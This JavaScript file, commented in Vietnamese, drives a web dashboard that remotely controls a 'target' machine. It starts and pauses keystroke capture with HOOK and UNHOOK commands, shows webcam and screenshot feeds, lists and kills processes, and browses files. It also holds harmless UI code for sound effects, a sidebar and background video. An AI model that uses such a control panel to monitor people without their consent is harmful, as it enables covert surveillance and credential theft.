    const btnDisconn = document.getElementById('btn-disconn');

    if (btnConn && btnDisconn) {
        // Mở lại nút Connect
        btnConn.innerHTML = '<i class="fas fa-link"></i> CONNECT';
        btnConn.disabled = false;
        btnConn.style.opacity = "1";
        btnConn.style.cursor = "pointer";

        // Khóa nút Disconnect
        btnDisconn.disabled = true;
        btnDisconn.style.opacity = "0.5";
        btnDisconn.style.cursor = "not-allowed";
    }
}

// ============ DISCONNECT FUNCTION (FIXED) ============
function disconnect() {
    // 1. Đóng kết nối nếu đang mở
    if (ws) {
        if (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING) {
            ws.close(); 
            logConsole(">> Socket closed by user.");
        }
    }
    handleDisconnect("User Manually Disconnected");

    // 2. Buộc reset giao diện ngay lập tức
    const statusText = document.getElementById('status-text');
    const statusDot = document.getElementById('status-dot');

    if(statusText) {
        statusText.innerText = "DISCONNECTED";
        statusText.style.color = "#555";
    }
    if(statusDot) statusDot.className = "status-indicator offline";
    
    resetConnectionUI();
    stopSessionTimer();
}

// Hàm dọn dẹp dữ liệu hiển thị khi ngắt kết nối
function resetDashboard() {
    // 1. Reset biến đếm toàn cục
    commandCount = 0;
    dataSize = 0;
    keystrokeCount = 0;
    isKeyloggerRunning = false;
    isPaused = false;
    const btnToggle = document.getElementById('btn-keylogger-toggle');
    if (btnToggle) {
        btnToggle.className = 'btn-action btn-success';
        btnToggle.innerHTML = '<i class="fas fa-play"></i> Start Capture';
    }

    // 3. Reset nút Pause
    const btnPause = document.getElementById('btn-keylogger-pause');
    if (btnPause) {
        btnPause.innerHTML = '<i class="fas fa-pause"></i> Pause';
        btnPause.classList.remove('pulse-animation');
        btnPause.style.border = "";
        btnPause.style.color = "";
    }
    // 2. Reset Thông tin hệ thống (System Info)
    safeSetText('sys-name', 'Waiting...');
    safeSetText('sys-user', '-');
    safeSetText('sys-os', 'Unknown');
    safeSetText('sys-uptime', '00:00:00');
    safeSetText('sys-cpu', '-');
    safeSetText('sys-ram', '-');
    safeSetText('sys-gpu', '-');
    safeSetText('sys-disk', '-');
    
    // 3. Reset các chỉ số thống kê (Stats)
    safeSetText('target-info', 'Awaiting Connection...');
    safeSetText('session-time', '00:00:00');
    safeSetText('cmd-count', '0');
    safeSetText('data-size', '0 KB');
    safeSetText('keystroke-count', '0');
    safeSetText('record-time', '00:00:00');
    stopRecordTimer();
    savedElapsedTime = 0; // Xóa thời gian đã lưu
    safeSetText('record-time', '00:00:00'); // Về 0 hiển thị
    // 4. Reset Hình ảnh (Webcam/Screenshot) về trạng thái chờ
    const imgCam = document.getElementById('img-cam');
    const phCam = document.getElementById('cam-placeholder');
    if (imgCam) { imgCam.style.display = 'none'; imgCam.src = ''; }
    if (phCam) phCam.style.display = 'flex';

    const imgScr = document.getElementById('img-scr');
    const phScr = document.getElementById('scr-placeholder');
    if (imgScr) { imgScr.style.display = 'none'; imgScr.src = ''; }
    if (phScr) phScr.style.display = 'flex';
    
    // 5. Xóa danh sách Process/App/File đang hiển thị
    const listProc = document.getElementById('list-proc');
    if (listProc) listProc.value = '';
    
    const appBody = document.getElementById('app-table-running');
    if (appBody) appBody.innerHTML = '<tr><td colspan="4" class="text-center">Disconnected</td></tr>';
    
    const fileBody = document.getElementById('file-list-body');
    if (fileBody) fileBody.innerHTML = '<tr><td colspan="4" class="text-center">Disconnected</td></tr>';
}


// ============ ADVANCED SOUND MIXER ============

// 1. Kho dữ liệu âm thanh (Link Online)
const soundLibrary = {
    rain: "sound\\rain.mp3",
    bird: "sound\\bird.mp3",
    fire: "sound\\fire.mp3",
    storm: "sound\\storm.mp3",
    coffee: "sound\\coffee.mp3", // Tiếng ồn quán cafe
    keyboard: "sound\\coffee.mp3",
    ocean: "sound\\ocean.mp3",
    night: "https://assets.mixkit.co/sfx/preview/mixkit-forest-at-night-1224.mp3"
};

// 2. Đối tượng lưu các âm thanh đang phát
const activeSounds = {}; 

// 3. Hàm Bật/Tắt âm thanh (Toggle)
function toggleSound(type, element) {
    // Phát tiếng click menu
    const clickSfx = document.getElementById('sfx-menu');
    if(clickSfx) { clickSfx.currentTime=0; clickSfx.play().catch(()=>{}); }

    if (activeSounds[type]) {
        // --- NẾU ĐANG CHẠY THÌ TẮT ---
        activeSounds[type].pause();
        delete activeSounds[type]; // Xóa khỏi danh sách
        element.classList.remove('active'); // Bỏ giao diện sáng
    } else {
        // --- NẾU CHƯA CHẠY THÌ BẬT ---
        const audio = new Audio(soundLibrary[type]);
        audio.loop = true; // Lặp lại vô tận
        audio.volume = 0.5; // Mặc định 50%
        audio.play().catch(e => console.log("Audio Error:", e));
        
        activeSounds[type] = audio; // Lưu vào danh sách
        element.classList.add('active'); // Bật giao diện sáng + hiện thanh volume
    }
}

// 4. Hàm chỉnh Volume cho từng âm thanh
function setVolume(type, value) {
    if (activeSounds[type]) {
        activeSounds[type].volume = value;
    }
}

// 5. Hàm tắt tất cả
function stopAllSounds() {
    for (let type in activeSounds) {
        activeSounds[type].pause();
    }
    // Xóa danh sách và Reset giao diện
    for (let member in activeSounds) delete activeSounds[member];
    
    // Bỏ class active ở tất cả các ô
    document.querySelectorAll('.sound-item').forEach(el => el.classList.remove('active'));
}

// 6. Hàm bật tắt Menu Mixer
function toggleAudioMenu() {
    const menu = document.getElementById('audio-menu');
    if(menu.classList.contains('show')) {
        menu.classList.remove('show');
    } else {
        menu.classList.add('show');
    }
}

// Đóng menu khi click ra ngoài
window.addEventListener('click', function(e) {
    const menu = document.getElementById('audio-menu');
    const btn = document.querySelector('.btn-audio');
    
    // Nếu click không trúng menu và không trúng nút, và không trúng thanh trượt (input)
    if (menu && btn && !menu.contains(e.target) && !btn.contains(e.target)) {
        menu.classList.remove('show');
    }
});
// --- LOGIC KEYLOGGER (Thêm mới) ---
let isKeyloggerRunning = false;
let isPaused = false;

// 1. Hàm Bật/Tắt (Start/Stop)
function toggleKeylogger() {
    const btn = document.getElementById('btn-keylogger-toggle');
    const btnPause = document.getElementById('btn-keylogger-pause');

    if (!isKeyloggerRunning) {
        // --- BẮT ĐẦU ---
        send('HOOK'); 
        
        // Đổi nút thành màu đỏ (Stop)
        btn.className = 'btn-action btn-danger';
        btn.innerHTML = '<i class="fas fa-stop"></i> Stop Capture';
        
        isKeyloggerRunning = true;
        isPaused = false;
    } else {
        // --- DỪNG LẠI ---
        send('UNHOOK');
        
        // Reset nút Start về màu xanh
        btn.className = 'btn-action btn-success';
        btn.innerHTML = '<i class="fas fa-play"></i> Start Capture';
        
        // Reset nút Pause về trạng thái thường (nếu đang pause)
        if(btnPause) {
            btnPause.innerHTML = '<i class="fas fa-pause"></i> Pause';
            btnPause.classList.remove('pulse-animation'); // Tắt nhấp nháy
            btnPause.style.border = ""; // Xóa viền
        }

        isKeyloggerRunning = false;
        isPaused = false;
    }
}

// 2. Hàm Tạm dừng/Tiếp tục (Pause/Resume)
function togglePause() {
    if (!isKeyloggerRunning) return alert("Keylogger chưa chạy!"); // Chặn nếu chưa Start

    const btn = document.getElementById('btn-keylogger-pause');

    if (!isPaused) {
        // --- TẠM DỪNG ---
        send('UNHOOK'); // Gửi lệnh dừng tạm thời
        
        btn.innerHTML = '<i class="fas fa-play"></i> Resume';
        btn.classList.add('pulse-animation'); // Thêm hiệu ứng nhấp nháy (có sẵn trong CSS)
        btn.style.border = "1px solid #ffaa00"; // Viền vàng cảnh báo
        btn.style.color = "#ffaa00";
        
        isPaused = true;
    } else {
        // --- TIẾP TỤC ---
        send('HOOK'); // Gửi lệnh chạy tiếp
        
        btn.innerHTML = '<i class="fas fa-pause"></i> Pause';
        btn.classList.remove('pulse-animation');
        btn.style.border = "";
        btn.style.color = "";
        
        isPaused = false;
    }
}


// Hàm Kill Process nhanh từ bảng
function killProcess(pid, event) {
    // Ngăn không cho sự kiện click trôi lên thẻ tr (tránh xung đột)
    if(event) event.stopPropagation();
    
    if(confirm("Force kill process PID: " + pid + "?")) {
        document.getElementById('proc-pid').value = pid; // Điền PID vào ô
        manage('PROCESS', 'KILL'); // Gọi hàm gửi lệnh cũ
    }
}
// --- HÀM STOP APP TRỰC TIẾP ---
// Hàm tắt ứng dụng nhanh (gọi từ nút STOP trên từng dòng)
function stopAppDirect(pid, event) {
    // Ngăn không cho sự kiện click lan ra dòng (để không bị chọn nhầm vào ô input)
    if(event) event.stopPropagation();
    
    if(confirm("Force STOP application PID: " + pid + "?")) {
        // Gửi lệnh tắt ngay lập tức
        send(`APP|KILL|${pid}`);
        
        // (Tùy chọn) Làm mờ dòng đó đi để biết đã bấm
        const btn = event.target.closest('button');
        if(btn) {
            const row = btn.closest('tr');
            if(row) row.style.opacity = "0.5";
        }
    }
}


// Hiệu ứng âm thanh khi bấm nút
document.addEventListener('click', function(e) {
    // Kiểm tra xem thứ vừa bấm có phải là Nút (hoặc icon bên trong nút) không
    const target = e.target.closest('button');
    
    if (target) {
        const sound = document.getElementById('sfx-pop');
        if (sound) {
            sound.currentTime = 0; // Tua lại từ đầu (để bấm liên tục được)
            sound.volume = 0.5;    // Âm lượng vừa phải (50%)
            sound.play().catch(err => {
                // Bỏ qua lỗi nếu trình duyệt chưa cho phép phát
                console.log("SFX Error:", err); 
            });
        }
    }
});

// Hiệu ứng âm thanh khi lướt chuột (Hover) - Enderman Style
document.addEventListener('DOMContentLoaded', () => {
    // Chọn tất cả các thành phần muốn có tiếng khi lướt qua
    const hoverElements = document.querySelectorAll('button, .menu li, .sound-item, .input-group input');

    hoverElements.forEach(element => {
        element.addEventListener('mouseenter', () => {
            const sound = document.getElementById('sfx-hover');
            if (sound) {
                // Mẹo giảm độ trễ: Tua về 0 lập tức trước khi phát
                sound.currentTime = 0; 
                
                // Enderman sound thường khá to và rùng rợn, nên để volume nhỏ hơn chút
                sound.volume = 0.4; 
                
                // Bắt buộc trình duyệt phát ngay (bỏ qua lỗi nếu chưa tương tác)
                const playPromise = sound.play();
                if (playPromise !== undefined) {
                    playPromise.catch(error => {
                        // Trình duyệt chặn auto-play nếu chưa click lần nào (không sao cả)
                    });
                }
            }
        });
    });
});

function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const icon = document.querySelector('.btn-toggle-menu i');
    
    // Phát âm thanh click
    const sound = document.getElementById('sfx-pop');
    if(sound) { sound.currentTime=0; sound.play().catch(()=>{}); }

    // LOGIC VÒNG LẶP: Normal -> Mini -> Hidden -> Normal
    
    if (sidebar.classList.contains('collapsed')) {
        // [2 -> 3] Đang Mini -> Chuyển sang Ẩn hoàn toàn
        sidebar.classList.remove('collapsed');
        sidebar.classList.add('hidden');
        
        // Đổi icon thành con mắt (Để báo hiệu bấm vào sẽ hiện lại)
        if(icon) icon.className = "fas fa-eye"; 
        
    } else if (sidebar.classList.contains('hidden')) {
        // [3 -> 1] Đang Ẩn -> Quay về Bình thường (Full)
        sidebar.classList.remove('hidden');
        
        // Đổi lại icon 3 gạch
        if(icon) icon.className = "fas fa-bars";
        
    } else {
        // [1 -> 2] Đang Bình thường -> Chuyển sang Mini
        sidebar.classList.add('collapsed');
        
        // Giữ nguyên icon 3 gạch
        if(icon) icon.className = "fas fa-bars";
    }
}

// ============ NEW MINIMIZE WORKFLOW ============

// 1. Hàm kích hoạt chuỗi Thu nhỏ (Bấm nút Vàng)
function triggerMinimizeSequence() {
    const app = document.querySelector('.app-container');
    const bgPanel = document.getElementById('bg-selector-panel');

    if (app && bgPanel) {
        // Ẩn giao diện chính
        app.classList.add('ui-minimized');
        // Hiện bảng chọn background
        bgPanel.classList.add('active');
        
        playSound('sfx-pop');
    }
}

// 2. Hàm hoàn tất chọn (Bấm vào ảnh thumbnail)
function finishBackgroundSelection(videoFile) {
    const bgPanel = document.getElementById('bg-selector-panel');
    const btnRestore = document.getElementById('btn-restore-ui');
    const videoElement = document.getElementById('bg-video');
    // Lưu ý: dùng .src trực tiếp trên thẻ video sẽ ổn định hơn là thay source
    
    // Nếu có chọn file video (không bấm Cancel)
    if (videoFile && videoElement) {
        videoElement.src = videoFile;
        videoElement.load(); // Load lại video mới
        videoElement.play(); // Phát ngay
    }

    // Ẩn bảng chọn
    if(bgPanel) bgPanel.classList.remove('active');
    // Hiện nút con mắt
    if(btnRestore) btnRestore.classList.add('visible');
    
    playSound('sfx-menu');
}

// 3. Hàm khôi phục giao diện (Bấm nút Con mắt)
function restoreUI() {
    const app = document.querySelector('.app-container');
    const btnRestore = document.getElementById('btn-restore-ui');
    const bgPanel = document.getElementById('bg-selector-panel');

    // Hiện lại giao diện chính
    if(app) app.classList.remove('ui-minimized');
    // Ẩn nút con mắt
    if(btnRestore) btnRestore.classList.remove('visible');
    // Đảm bảo bảng chọn đã ẩn (đề phòng)
    if(bgPanel) bgPanel.classList.remove('active');

    playSound('sfx-pop');
}